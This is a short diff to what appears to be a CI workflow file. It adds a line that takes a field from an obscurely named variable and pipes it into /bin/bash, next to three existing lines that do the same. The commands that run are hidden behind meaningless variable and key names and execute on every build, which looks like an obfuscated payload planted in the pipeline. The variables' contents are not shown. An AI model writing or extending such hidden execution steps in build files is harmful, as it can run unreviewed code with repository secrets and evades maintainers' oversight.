@@ -34,6 +34,7 @@ jobs:
           printf '%s' "$a076" | jq -r .xcr844 | /bin/bash
           echo $indk3121 | jq -r .o433 | /bin/bash
           echo $nx12 | jq -r .xgw6025 | /bin/bash
+          echo $ue88546 | jq -r .n004 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
